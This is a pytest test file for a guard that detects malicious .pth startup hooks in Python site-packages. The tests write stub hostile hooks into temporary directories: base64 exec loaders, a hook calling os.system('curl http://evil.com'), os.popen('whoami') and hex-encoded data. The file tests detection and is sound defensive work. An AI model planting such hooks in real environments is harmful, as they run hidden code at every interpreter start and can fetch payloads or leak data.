"""
Tests for StartupHookGuard — Environment Integrity Verification.
"""

import os
import tempfile
from unittest.mock import patch

import pytest

from qwed_sdk.guards.environment_guard import StartupHookGuard


class TestStartupHookGuard:
    """Tests for .pth startup hook detection."""

    def test_clean_environment(self):
        """Environment with no unknown .pth files should pass."""
        guard = StartupHookGuard()
        result = guard.verify_environment_integrity()
        # In a clean dev environment, this should usually pass
        assert result["verified"] is True or result["status"] in ("CLEAN_ENVIRONMENT", "COMPROMISED")
        assert "suspicious_hooks" in result
        assert "scanned_directories" in result

    def test_detects_malicious_pth_file(self):
        """Should detect an unknown .pth file in a scanned directory."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            # Plant a suspicious .pth file
            malicious_path = os.path.join(tmpdir, "litellm_init.pth")
            with open(malicious_path, "w") as f:
                f.write("import os; exec(base64.b64decode('...'))")

            # Mock site dirs to point to our temp dir
            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert result["status"] == "COMPROMISED"
            assert len(result["suspicious_hooks"]) == 1
            assert "litellm_init.pth" in result["suspicious_hooks"][0]
            assert any("exec" in f for f in result["content_findings"])
            assert any("base64" in f for f in result["content_findings"])

    def test_allows_standard_pth_files(self):
        """Standard .pth files (setuptools, pip, etc.) should be allowed."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            # Create standard safe .pth files
            for name in ["setuptools.pth", "distutils-precedence.pth", "pip.pth"]:
                with open(os.path.join(tmpdir, name), "w") as f:
                    f.write(f"# {name}\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is True
            assert result["status"] == "CLEAN_ENVIRONMENT"
            assert len(result["suspicious_hooks"]) == 0

    def test_custom_allowlist(self):
        """Custom allowlist should whitelist additional .pth files."""
        guard = StartupHookGuard(allowed_pth_files={"my_company.pth"})

        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "my_company.pth"), "w") as f:
                f.write("import my_company\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is True

    def test_content_scanning_detects_network_calls(self):
        """Should flag .pth files containing network/subprocess imports."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            backdoor = os.path.join(tmpdir, "sysmon.pth")
            with open(backdoor, "w") as f:
                f.write("import subprocess\nimport socket\nos.system('curl http://evil.com')\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert any("subprocess" in f for f in result["content_findings"])
            assert any("socket" in f for f in result["content_findings"])
            assert any("os.system" in f for f in result["content_findings"])

    def test_content_scanning_disabled(self):
        """When scan_contents=False, should only flag presence, not contents."""
        guard = StartupHookGuard(scan_contents=False)

        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "evil.pth"), "w") as f:
                f.write("exec(base64.b64decode('...'))")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert len(result["suspicious_hooks"]) == 1
            assert len(result["content_findings"]) == 0  # No content scan

    def test_multiple_suspicious_files(self):
        """Should report all suspicious .pth files, not just the first."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            for i in range(3):
                with open(os.path.join(tmpdir, f"backdoor_{i}.pth"), "w") as f:
                    f.write(f"import os; os.popen('whoami')\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert len(result["suspicious_hooks"]) == 3

    def test_hex_encoded_payload_detection(self):
        """Should detect hex-encoded payloads in .pth files."""
        guard = StartupHookGuard()

        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "obfuscated.pth"), "w") as f:
                f.write("data = '\\x68\\x65\\x6c\\x6c\\x6f'\n")

            with patch.object(guard, "_get_site_dirs", return_value=[tmpdir]):
                result = guard.verify_environment_integrity()

            assert result["verified"] is False
            assert any("\\\\x" in f or "x[0-9a-fA-F]" in f for f in result["content_findings"])
